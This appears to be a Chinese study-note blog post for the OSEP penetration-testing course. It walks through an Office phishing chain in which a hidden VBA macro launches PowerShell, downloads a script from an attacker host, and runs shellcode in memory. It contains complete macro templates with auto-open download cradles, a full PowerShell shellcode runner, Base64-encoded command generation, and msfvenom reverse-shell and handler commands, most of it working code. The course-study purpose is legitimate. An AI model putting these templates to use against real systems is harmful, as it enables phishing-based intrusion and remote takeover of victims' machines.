---
title: OSEP-03-PowerShell-Shellcode
description: '03-Office宏攻击 | 06-PowerShell-Shellcode'
pubDate: 2026-01-30T00:00:15+08:00
image: /image/fengmian/OSEP.png
categories:
  - Documentation
  - OffSec
tags:
  - PEN-300-OSEP
  - Windows Learning
  - Exploit Development
  - PowerShell
  - Phishing
---

# PowerShell Shellcode 执行链完整指南

> 对应参考资料：`1：office钓鱼.html` 中的 `3.3 PowerShell Shellcode Runner`。  
> 学习定位：把 Office 宏、PowerShell、P/Invoke、下载摇篮、内存执行和排错串成一条初学者能复盘的链路。只在授权实验环境中学习和验证。

## 这篇解决什么问题

前面你已经学过两种能力：

```text
VBA 宏能自动触发
VBA 可以调用 Win32 API
```

但直接把 shellcode 放进 Word 文档里有明显问题：

| 问题 | 为什么影响实战和考试 |
|---|---|
| shellcode 嵌在文档中 | 文档静态特征明显，修改 payload 要重新做文档 |
| 在 Word 进程中运行 | Word 崩溃或关闭会影响连接 |
| VBA 调试能力弱 | 复杂逻辑写在 VBA 中很痛苦 |
| API 模式容易被识别 | `VirtualAlloc + RtlMoveMemory + CreateThread` 是典型行为 |

PowerShell Shellcode Runner 的思路是把 Office 变成“入口”，把更复杂的执行逻辑交给 PowerShell：

```text
Word 文档
  -> VBA 宏自动触发
  -> 启动 powershell.exe
  -> PowerShell 下载或接收脚本
  -> PowerShell 通过 .NET/PInvoke 调用 Win32 API
  -> 在 powershell.exe 进程中执行 shellcode
```

重点不是“PowerShell 更神奇”，而是攻击链分层后更容易替换、调试和排错。

---

## 一、先理解三种执行方式

### 1.1 方式 A：VBA 直接执行 shellcode

```text
Word 文档
  -> VBA 数组中包含 shellcode
  -> VirtualAlloc/RtlMoveMemory/CreateThread
  -> shellcode 在 WINWORD.EXE 内运行
```

优点：

| 优点 | 说明 |
|---|---|
| 链路短 | 不依赖 PowerShell |
| 便于理解底层 | 能直接看到内存分配和线程创建 |
| 适合学习 API | 对 Win32 API 训练效果好 |

缺点：

| 缺点 | 说明 |
|---|---|
| 文档包含 payload | 静态特征明显 |
| 修改麻烦 | 每次换 payload 都要改文档 |
| 依赖 Word 进程 | Word 退出可能影响连接 |

### 1.2 方式 B：VBA 启动 PowerShell 执行本地命令

```text
Word 文档
  -> VBA 启动 PowerShell
  -> PowerShell 执行一段命令
```

最小测试：

```vba
Sub RunPowerShellTest()
    Dim cmd As String
    cmd = "powershell -NoProfile -ExecutionPolicy Bypass -Command ""whoami"""
    CreateObject("WScript.Shell").Run cmd, 0, True
End Sub
```

这一步用于确认：

| 检查点 | 意义 |
|---|---|
| `powershell.exe` 能否启动 | 目标是否阻止 PowerShell |
| 参数是否正确 | 引号、空格、编码是否有问题 |
| 进程是否隐藏 | `Run cmd, 0, ...` 的窗口参数是否生效 |
| 是否等待 | 第三个参数 `True/False` 决定是否等待 |

### 1.3 方式 C：VBA 启动 PowerShell 下载远程脚本

```text
Word 文档
  -> VBA 只有下载摇篮
  -> PowerShell 从攻击机下载 run.ps1
  -> run.ps1 中包含 shellcode runner
```

优势：

| 优势 | 说明 |
|---|---|
| 文档更小 | 文档中不直接放完整 shellcode |
| payload 可更新 | 只需要替换服务器上的脚本 |
| 调试更方便 | 可以单独在 PowerShell 中测试脚本 |
| 分层更清晰 | 入口、下载、执行、回连分开排查 |

这也是课程中引入 PowerShell Shellcode Runner 的核心原因。

---

## 二、VBA 如何启动 PowerShell

### 2.1 使用 `Shell`

```vba
Sub RunWithShell()
    Dim cmd As String
    cmd = "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""Write-Output test"""
    Shell cmd, vbHide
End Sub
```

特点：

| 项目 | 说明 |
|---|---|
| 简单 | VBA 内置函数 |
| 可隐藏窗口 | `vbHide` |
| 控制能力有限 | 不如 `WScript.Shell` 灵活 |

### 2.2 使用 `WScript.Shell`

```vba
Sub RunWithWScript()
    Dim wsh As Object
    Dim cmd As String

    Set wsh = CreateObject("WScript.Shell")
    cmd = "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""Write-Output test"""

    wsh.Run cmd, 0, False
End Sub
```

`Run` 的三个参数：

| 参数 | 示例 | 含义 |
|---|---|---|
| 第 1 个 | `cmd` | 要执行的命令 |
| 第 2 个 | `0` | 窗口样式，0 表示隐藏 |
| 第 3 个 | `False` | 是否等待命令结束 |

学习阶段建议：

```text
调试时用 True，方便知道命令何时结束
稳定后用 False，让 PowerShell 独立运行
```

### 2.3 常用 PowerShell 参数

| 参数 | 全称 | 含义 |
|---|---|---|
| `-NoProfile` | `-nop` | 不加载用户配置，减少干扰 |
| `-ExecutionPolicy Bypass` | `-ep bypass` | 绕过执行策略限制 |
| `-WindowStyle Hidden` | `-w hidden` | 隐藏窗口 |
| `-Command` | `-c` | 执行后面的命令 |
| `-EncodedCommand` | `-enc` | 执行 Base64 编码命令 |

注意：`ExecutionPolicy` 不是安全边界，它主要是脚本执行策略。遇到 AMSI/EDR 阻断时，`-ep bypass` 并不能解决所有问题。

---

## 三、下载摇篮 Download Cradle

### 3.1 什么是下载摇篮

下载摇篮是一段很短的代码，用来下载并执行远程脚本：

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://<KALI_IP>/run.ps1')
```

拆开看：

| 片段 | 含义 |
|---|---|
| `New-Object Net.WebClient` | 创建 WebClient 对象 |
| `DownloadString(url)` | 下载 URL 内容为字符串 |
| `IEX` | `Invoke-Expression`，把字符串当 PowerShell 执行 |

流程：

```text
powershell.exe
  -> HTTP 请求 run.ps1
  -> 内容保存在内存字符串中
  -> IEX 执行字符串
  -> 默认不把脚本保存成文件
```

### 3.2 VBA 中的下载摇篮

```vba
Sub AutoOpen()
    DownloadAndExecute
End Sub

Sub Document_Open()
    DownloadAndExecute
End Sub

Sub DownloadAndExecute()
    Dim cmd As String

    cmd = "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command " & _
          """IEX (New-Object Net.WebClient).DownloadString('http://<KALI_IP>/run.ps1')"""

    CreateObject("WScript.Shell").Run cmd, 0, False
End Sub
```

引号是常见坑：

| 层级 | 需要处理的引号 |
|---|---|
| VBA 字符串 | 用 `"` 包住整段命令 |
| PowerShell `-Command` | 需要传入一段带空格的命令 |
| URL 字符串 | PowerShell 内部用单引号最省事 |
| VBA 中表示双引号 | 写成 `""` |

### 3.3 先做最小下载测试

不要第一次就下载 shellcode runner。先下载一个普通文本：

Kali 侧：

```bash
echo "download ok" > test.txt
python3 -m http.server 80
```

Windows 侧：

```powershell
(New-Object Net.WebClient).DownloadString('http://<KALI_IP>/test.txt')
```

VBA 侧：

```vba
Sub TestDownload()
    Dim cmd As String
    cmd = "powershell -NoProfile -ExecutionPolicy Bypass -Command " & _
          """(New-Object Net.WebClient).DownloadString('http://<KALI_IP>/test.txt')"""
    CreateObject("WScript.Shell").Run cmd, 1, True
End Sub
```

如果这个失败，先排查网络、代理、DNS、防火墙，不要急着换 payload。

---

## 四、PowerShell 如何调用 Win32 API

PowerShell 本身不能像 VBA 的 `Declare` 那样直接声明 Win32 API。它通常通过 .NET 的 P/Invoke 间接调用。

```text
PowerShell
  -> .NET Framework
    -> Add-Type 编译 C# API 声明
      -> P/Invoke 调用 kernel32.dll
```

### 4.1 Add-Type 的作用

`Add-Type` 可以把 C# 代码编译并加载到当前 PowerShell 会话。

示例：调用 `MessageBox`。

```powershell
$User32 = @"
using System;
using System.Runtime.InteropServices;

public class User32 {
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int MessageBox(IntPtr hWnd, String text, String caption, int options);
}
"@

Add-Type $User32
[User32]::MessageBox([IntPtr]::Zero, "Hello", "PowerShell PInvoke", 0)
```

理解重点：

| 代码 | 含义 |
|---|---|
| `@" ... "@` | PowerShell 多行字符串 |
| `using System.Runtime.InteropServices` | 引入 P/Invoke 所需命名空间 |
| `[DllImport("user32.dll")]` | 声明 DLL 导入 |
| `public static extern` | 声明外部函数 |
| `Add-Type` | 编译 C# 并加载 |
| `[User32]::MessageBox(...)` | 调用静态方法 |

### 4.2 Kernel32 API 声明

PowerShell Shellcode Runner 常用：

```powershell
$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(
        IntPtr lpAddress,
        uint dwSize,
        uint flAllocationType,
        uint flProtect
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        uint dwCreationFlags,
        IntPtr lpThreadId
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern UInt32 WaitForSingleObject(
        IntPtr hHandle,
        UInt32 dwMilliseconds
    );
}
"@

Add-Type $Kernel32
```

PowerShell 版和 VBA 版的区别：

| 动作 | VBA | PowerShell |
|---|---|---|
| 声明 API | `Declare PtrSafe Function` | C# + `DllImport` + `Add-Type` |
| 指针类型 | `LongPtr` | `IntPtr` |
| 字节数组 | `Array(...)` | `[Byte[]] @(...)` |
| 复制内存 | `RtlMoveMemory` 循环 | `Marshal.Copy` |
| 执行线程 | `CreateThread` | `CreateThread` |

### 4.3 Marshal.Copy

PowerShell 里通常用 `Marshal.Copy` 把托管数组复制到非托管内存：

```powershell
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $buf.Length)
```

参数：

| 参数 | 含义 |
|---|---|
| `$buf` | 源字节数组 |
| `0` | 从源数组第 0 个元素开始 |
| `$addr` | 目标内存地址 |
| `$buf.Length` | 复制长度 |

这一步对应 VBA 里的 `RtlMoveMemory` 循环。

---

## 五、完整 PowerShell Shellcode Runner 模板

这个模板用于理解执行链。请只在授权实验环境中使用。

```powershell
$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(
        IntPtr lpAddress,
        uint dwSize,
        uint flAllocationType,
        uint flProtect
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        uint dwCreationFlags,
        IntPtr lpThreadId
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern UInt32 WaitForSingleObject(
        IntPtr hHandle,
        UInt32 dwMilliseconds
    );
}
"@

Add-Type $Kernel32

# 替换为你在授权实验环境中生成的 shellcode。
# x86/x64 必须与当前 powershell.exe 进程位数一致。
[Byte[]] $buf = @(
    0xfc, 0x48, 0x83, 0xe4, 0xf0
    # ... shellcode bytes ...
)

$MEM_COMMIT = 0x1000
$MEM_RESERVE = 0x2000
$PAGE_EXECUTE_READWRITE = 0x40
$INFINITE = 0xFFFFFFFF

$size = $buf.Length

$addr = [Kernel32]::VirtualAlloc(
    [IntPtr]::Zero,
    $size,
    $MEM_COMMIT -bor $MEM_RESERVE,
    $PAGE_EXECUTE_READWRITE
)

if ($addr -eq [IntPtr]::Zero) {
    throw "VirtualAlloc failed"
}

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)

$thread = [Kernel32]::CreateThread(
    [IntPtr]::Zero,
    0,
    $addr,
    [IntPtr]::Zero,
    0,
    [IntPtr]::Zero
)

if ($thread -eq [IntPtr]::Zero) {
    throw "CreateThread failed"
}

[Kernel32]::WaitForSingleObject($thread, [UInt32]$INFINITE)
```

关键点：

| 关键点 | 说明 |
|---|---|
| `[Byte[]]` | 强制数组是字节数组 |
| `[IntPtr]::Zero` | 等价于空指针 |
| `-bor` | 按位或，组合 `MEM_COMMIT` 和 `MEM_RESERVE` |
| `Marshal.Copy` | 把 shellcode 写到分配的内存 |
| `WaitForSingleObject` | 防止 PowerShell 进程提前退出 |

---

## 六、从 VBA 到 PowerShell 的完整实验链

### 6.1 攻击机准备

生成 PowerShell 格式 payload：

```bash
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=<KALI_IP> \
  LPORT=443 \
  EXITFUNC=thread \
  -f ps1
```

启动 Web 服务：

```bash
cd /var/www/html
python3 -m http.server 80
```

启动 handler：

```bash
msfconsole -q
use multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST <KALI_IP>
set LPORT 443
run
```

三处必须一致：

```text
msfvenom payload
handler payload
PowerShell 进程位数
```

### 6.2 run.ps1 内容结构

`run.ps1` 不要只是粘一大段 payload，要分块写，便于排错：

```text
1. 参数与环境检查
2. Kernel32 P/Invoke 声明
3. shellcode 字节数组
4. VirtualAlloc 分配内存
5. Marshal.Copy 复制 shellcode
6. CreateThread 执行
7. WaitForSingleObject 保持线程
```

建议在学习阶段保留简单输出：

```powershell
Write-Host "[*] PowerShell bitness: $([Environment]::Is64BitProcess)"
Write-Host "[*] Shellcode size: $($buf.Length)"
Write-Host "[*] Allocated: $addr"
```

等链路跑通后再隐藏输出。

### 6.3 Word 宏内容结构

宏只负责触发和下载：

```vba
Sub AutoOpen()
    Stage
End Sub

Sub Document_Open()
    Stage
End Sub

Sub Stage()
    Dim url As String
    Dim cmd As String

    url = "http://<KALI_IP>/run.ps1"
    cmd = "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command " & _
          """IEX (New-Object Net.WebClient).DownloadString('" & url & "')"""

    CreateObject("WScript.Shell").Run cmd, 0, False
End Sub
```

---

## 七、Base64 EncodedCommand

### 7.1 为什么会用 `-EncodedCommand`

`-EncodedCommand` 常用于解决复杂引号和特殊字符问题：

```text
原始命令里有很多引号、括号、管道符
  -> VBA 字符串容易写错
  -> 编码成 UTF-16LE Base64
  -> 传给 powershell -EncodedCommand
```

注意：Base64 不是加密，只是编码。它能减少引号错误，但不能从根本上绕过检测。

### 7.2 生成编码命令

PowerShell 的 `-EncodedCommand` 需要 UTF-16LE 编码：

```powershell
$cmd = "IEX (New-Object Net.WebClient).DownloadString('http://<KALI_IP>/run.ps1')"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$encoded = [Convert]::ToBase64String($bytes)
$encoded
```

VBA 中使用：

```vba
Sub RunEncoded()
    Dim encoded As String
    Dim cmd As String

    encoded = "<BASE64_HERE>"
    cmd = "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand " & encoded

    CreateObject("WScript.Shell").Run cmd, 0, False
End Sub
```

### 7.3 编码常见错误

| 现象 | 原因 | 处理 |
|---|---|---|
| PowerShell 报乱码 | 用了 UTF-8 而不是 UTF-16LE | 用 `[Text.Encoding]::Unicode` |
| 命令执行不完整 | Base64 字符串被换行截断 | 去掉换行 |
| VBA 字符串过长 | 一行太长 | 分段拼接 |
| 仍被拦截 | Base64 不是免杀 | 转到 AMSI/CLM 和 AV 绕过章节 |

---

## 八、Add-Type 的关键风险

课程中特别强调：`Add-Type` 并不总是“纯内存”。

### 8.1 Add-Type 可能产生临时文件

典型流程：

```text
PowerShell 执行 Add-Type
  -> 把 C# 源码写入临时文件
  -> 调用编译器生成程序集
  -> 加载程序集
  -> 清理临时文件
```

这意味着它可能留下：

| 痕迹 | 风险 |
|---|---|
| 临时 `.cs` 文件 | 被文件监控发现 |
| 临时 `.dll` 文件 | 被 AV/EDR 扫描 |
| `csc.exe` 进程 | 行为特征明显 |
| 加载的动态程序集 | 内存和日志可见 |

验证思路：

```powershell
[AppDomain]::CurrentDomain.GetAssemblies() |
  Select-Object FullName, Location
```

Process Monitor 过滤建议：

```text
Process Name is powershell.exe
Operation is WriteFile
Path contains Temp
```

### 8.2 为什么下一章要学反射

反射技术的目标不是“更炫”，而是减少 `Add-Type` 带来的编译和文件痕迹。

衔接关系：

```text
PowerShell + Add-Type
  -> 通过 C# 声明 Win32 API
  -> 简单直观
  -> 可能产生临时文件

PowerShell + Reflection
  -> 从已加载程序集里找函数
  -> 动态创建委托
  -> 避免 Add-Type 编译路径
```

所以本篇你先学清楚 P/Invoke，下一篇再理解为什么要绕开 `Add-Type`。

---

## 九、AMSI、CLM 和执行策略的边界

很多初学者会把这些概念混在一起。

| 机制 | 解决/限制什么 | 本章中的表现 |
|---|---|---|
| ExecutionPolicy | 脚本执行策略 | `-ExecutionPolicy Bypass` 常能绕过策略限制 |
| AMSI | 脚本内容扫描接口 | 可拦截明显恶意字符串和行为 |
| CLM | Constrained Language Mode | 限制 .NET、反射、复杂类型调用 |
| AppLocker/WDAC | 应用白名单 | 可能限制 `powershell.exe` 或脚本路径 |
| Defender/EDR | 文件、内存、行为检测 | 可能拦截 payload、RWX 内存、网络行为 |

判断顺序：

```text
PowerShell 启动不了
  -> 查 AppLocker/WDAC/路径限制

PowerShell 能启动，命令不执行
  -> 查执行策略、命令引号、CLM

命令执行时报恶意内容
  -> 查 AMSI/Defender

shellcode 执行但无会话
  -> 查位数、handler、网络、代理
```

相关章节：

| 问题 | 去哪里看 |
|---|---|
| AMSI 报恶意内容 | `08-AMSI绕过` |
| CLM 限制 .NET 调用 | `08-AMSI绕过`、`09-应用白名单绕过` |
| PowerShell 被白名单限制 | `09-应用白名单绕过` |
| 出网失败 | `10-网络过滤绕过` |
| 静态或行为检测 | `07-杀软绕过` |

---

## 十、完整排错流程

### 10.1 从入口到会话的分层检查

```text
第 1 层：文档是否触发宏
第 2 层：宏是否能启动 PowerShell
第 3 层：PowerShell 是否能执行简单命令
第 4 层：PowerShell 是否能访问攻击机 Web 服务
第 5 层：run.ps1 是否下载成功
第 6 层：Add-Type 是否成功
第 7 层：VirtualAlloc 是否成功
第 8 层：CreateThread 是否成功
第 9 层：handler 是否收到连接
```

每层都有最小验证：

| 层级 | 最小验证 |
|---|---|
| 宏触发 | `MsgBox "triggered"` |
| 启动 PowerShell | `powershell -Command "whoami"` |
| 执行命令 | 写入临时测试文件 |
| 网络访问 | 下载 `test.txt` |
| 下载脚本 | `Write-Host "run.ps1 loaded"` |
| Add-Type | 调用 `MessageBox` 或 `GetDriveType` |
| VirtualAlloc | 输出 `$addr` |
| CreateThread | 检查返回句柄 |
| 回连 | handler、抓包、目标出站连接 |

### 10.2 典型失败表

| 现象 | 优先判断 | 快速验证 | 下一步 |
|---|---|---|---|
| 打开文档无反应 | 宏没触发 | `MsgBox` | 查 Office 安全机制 |
| PowerShell 窗口闪退 | 命令报错或立即结束 | `Run cmd, 1, True` | 暂时显示窗口调试 |
| 下载失败 | 网络/代理/DNS | 下载 `test.txt` | 看网络过滤章节 |
| `Add-Type` 报错 | C# 代码语法或 CLM | 单独运行 P/Invoke 示例 | 简化代码或查 CLM |
| `VirtualAlloc` 返回 0 | 参数或进程限制 | 输出地址 | 检查常量和位数 |
| 无会话 | payload/handler/网络 | 对齐 payload | 抓包或换最小 payload |
| 会话断开 | 线程退出或进程退出 | 加 `WaitForSingleObject` | 确认 `EXITFUNC=thread` |
| 目标报恶意 | AMSI/Defender | 看错误文本 | 转 AMSI/AV 章节 |

### 10.3 初学者复盘模板

每次实验记录：

```text
实验日期：
目标系统：
Office 位数：
PowerShell 位数：
Payload 类型：
LHOST/LPORT：
宏入口：
下载 URL：
最小命令是否成功：
下载测试是否成功：
Add-Type 是否成功：
VirtualAlloc 返回：
CreateThread 返回：
handler 结果：
失败原因：
下一步调整：
```

有了这个模板，你会从“乱换 payload”变成“定位是哪一层坏了”。

---

## 十一、考试视角的取舍

OSEP 考试里，Office 宏链路不只是写 payload，而是快速判断哪条路更稳。

| 场景 | 优先选择 |
|---|---|
| 宏能触发、PowerShell 可用 | VBA 下载摇篮 + PowerShell runner |
| PowerShell 被限制 | 纯 VBA runner、JScript、HTA 或其他客户端入口 |
| 出网受限 | 先做代理/DNS/端口判断 |
| Add-Type 被拦 | 反射式 PowerShell |
| 文档投递受阻 | HTML Smuggling 或其他投递方式 |
| AV 对 shellcode 敏感 | 编码、加密、分阶段、替代加载器 |

你要形成的思维：

```text
不要执着于某一个 payload。
先判断入口是否触发，再判断执行环境，再判断网络，再判断防护。
```

---

## 十二、复习清单

```text
□ 能解释为什么要把执行逻辑从 Word 挪到 PowerShell
□ 能写出 VBA 启动 PowerShell 的最小代码
□ 能解释 WScript.Shell.Run 三个参数
□ 能解释 DownloadString + IEX 的下载摇篮
□ 能解释 PowerShell 为什么需要 Add-Type 调用 Win32 API
□ 能解释 P/Invoke、DllImport、IntPtr 的作用
□ 能说明 Marshal.Copy 对应 VBA 中的哪一步
□ 能解释 Add-Type 为什么可能产生临时文件
□ 能区分 ExecutionPolicy、AMSI、CLM、AppLocker
□ 能按九层排错流程定位失败位置
```

---

## 十三、练习任务

### 练习 1：最小 PowerShell 启动

1. 用 VBA 启动 `powershell -Command "whoami"`。
2. 先让窗口显示，再改成隐藏。
3. 记录 `Run cmd, 0, False` 和 `Run cmd, 1, True` 的区别。

### 练习 2：下载摇篮

1. 在 Kali 上启动 `python3 -m http.server 80`。
2. 放一个 `test.txt`。
3. 在 Windows PowerShell 中下载。
4. 再通过 VBA 调用 PowerShell 下载。

### 练习 3：P/Invoke

1. 用 `Add-Type` 调用 `MessageBox`。
2. 用 `Add-Type` 声明 `VirtualAlloc`。
3. 输出返回地址，确认 API 可调用。

### 练习 4：完整链路

1. 写 `run.ps1`，分块保存。
2. 宏只负责下载和执行。
3. handler 与 payload 保持一致。
4. 失败时按九层排错表记录。

---

## 十四、和下一节的关系

本篇用 `Add-Type` 是为了让你看清 P/Invoke 和 Win32 API 调用模型。下一步学习 [07-反射技术.md](/blog/osep/03-office宏攻击/07-反射技术/) 时，你要重点关注：

```text
如何不用 Add-Type 也能拿到 Win32 API 地址
如何用委托调用函数
如何减少磁盘编译痕迹
为什么反射式加载适合客户端攻击链
```

**下一节建议**：先复习 [02-VBA调用Win32API.md](/blog/osep/03-office宏攻击/02-vba调用win32api/)，再读 [07-反射技术.md](/blog/osep/03-office宏攻击/07-反射技术/)。
